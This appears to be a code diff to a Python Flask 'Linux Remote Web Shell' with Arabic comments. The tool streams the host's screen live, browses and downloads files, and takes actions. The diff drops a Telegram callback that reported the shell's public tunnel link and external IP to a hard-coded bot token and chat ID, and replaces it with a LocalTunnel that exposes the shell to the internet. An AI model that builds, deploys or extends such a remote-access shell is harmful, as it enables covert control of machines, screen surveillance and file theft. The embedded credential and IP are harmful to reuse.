@@ -4,9 +4,6 @@ import os
 import subprocess
 import threading
 import time
-import urllib.request
-import urllib.parse
-import json
 import re
 import mss
 import cv2
@@ -14,46 +11,35 @@ import numpy as np
 
 app = Flask(__name__)
 
-# ضع بيانات تيليجرام الخاصة بك هنا لتستقبل الرابط عليها تلقائياً
-TELEGRAM_BOT_TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
-TELEGRAM_CHAT_ID = "8897834377"
-
-# الأيبي الخارجي المعتمد
 EXTERNAL_IP = "193.222.96.71"
 
-def send_telegram_message(message):
-    try:
-        url = "https://api.telegram.org/bot{}/sendMessage".format(TELEGRAM_BOT_TOKEN)
-        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message})
-        data = data.encode('utf-8')
-        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req)
-    except Exception as e:
-        print("[-] Telegram Error: {}".format(e))
-
-# دالة تشغيل Serveo تلقائياً وإرسال الرابط والأيبي للتيليجرام
-def start_serveo_and_notify():
+# دالة تشغيل LocalTunnel وطباعة الرابط في الطرفية مباشرة
+def start_localtunnel():
     time.sleep(3)
     try:
-        os.system("ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo_log.txt 2>&1 &")
+        os.system("lt --port 8080 > localtunnel_log.txt 2>&1 &")
         
         public_url = None
-        for _ in range(10):
+        for _ in range(12):
             time.sleep(2)
-            if os.path.exists("serveo_log.txt"):
-                with open("serveo_log.txt", "r") as f:
+            if os.path.exists("localtunnel_log.txt"):
+                with open("localtunnel_log.txt", "r") as f:
                     content = f.read()
-                    match = re.search(r'https://[a-zA-Z0-9-]+\.serveo\.net', content)
+                    match = re.search(r'https://[a-zA-Z0-9-]+\.loca\.lt', content)
                     if match:
                         public_url = match.group(0)
                         break
         
-        # استخدام الأيبي المحدّد مع الرابط في رسالة تيليجرام
-        msg = "🚀 مرحباً يا محمد! تم تشغيل الـ Web Shell بنجاح.\n\n🌐 الأيبي الخارجي: {}\n🔗 رابط الدخول المباشر:\n{}".format(EXTERNAL_IP, public_url if public_url else "http://{}".format(EXTERNAL_IP))
-        send_telegram_message(msg)
-        print("[+] تم إرسال البيانات إلى تيليجرام بنجاح!")
+        if public_url:
+            print("\n" + "="*50)
+            print("[+] تم تشغيل النفق بنجاح!")
+            print("[+] رابط الدخول الخارجي: {}".format(public_url))
+            print("[+] الأيبي الخارجي: {}".format(EXTERNAL_IP))
+            print("="*50 + "\n")
+        else:
+            print("[-] لم يتم العثور على رابط LocalTunnel في السجلات.")
     except Exception as e:
-        print("[-] خطأ في التشغيل: {}".format(e))
+        print("[-] خطأ في تشغيل LocalTunnel: {}".format(e))
 
 # دالة التقاط الشاشة للبث الحي
 def generate_frames():
@@ -108,7 +94,7 @@ HTML_TEMPLATE = """
         <img src="{{ url_for('video_feed') }}" alt="Live Stream">
     </div>
     <div class="container">
-        <h2>⚡ Linux Remote Web Shell (IP: 193.222.96.71) ⚡</h2>
+        <h2>⚡ Linux Remote Web Shell (Clean Version) ⚡</h2>
         <div class="section">
             <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
             <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
@@ -163,7 +149,7 @@ def index():
     current_path = request.args.get('path', os.getcwd())
     current_path = os.path.abspath(current_path)
     parent_path = os.path.dirname(current_path)
-    output = "أهلاً بك يا محمد! النظام يعمل على الأيبي الخارجي 193.222.96.71:\n"
+    output = "أهلاً بك يا محمد! النظام يعمل بنسخة نقية بدون تيليجرام:\n"
     
     if request.method == "POST":
         action = request.form.get("action")
@@ -208,7 +194,7 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
-    t = threading.Thread(target=start_serveo_and_notify)
+    t = threading.Thread(target=start_localtunnel)
     t.daemon = True
     t.start()
     
